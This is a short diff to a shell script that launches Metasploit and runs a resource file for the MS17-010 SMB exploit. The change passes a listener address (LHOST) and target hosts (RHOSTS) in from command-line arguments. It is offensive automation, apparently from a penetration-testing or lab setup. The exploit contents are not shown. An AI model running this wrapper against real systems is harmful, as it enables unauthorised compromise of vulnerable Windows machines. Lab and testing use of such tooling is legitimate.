@@ -17,8 +17,7 @@ then
     exit
 fi
 
-echo "Starting MSF and running /msfscripts/ms17_010.rc: "
-# Run the resource file with the given payload
+echo "Starting MSF and running /msfscripts/ms17_010.rc"
 msfdb start
-msfconsole -r ./msfscripts/ms17_010.rc
-# msfconsole -r /msfscripts/ms17_010.rc -x "use $payload"
+msfconsole -q -x "setg LHOST $1;setg RHOSTS $2;resource ./msfscripts/ms17_010.rc"
+
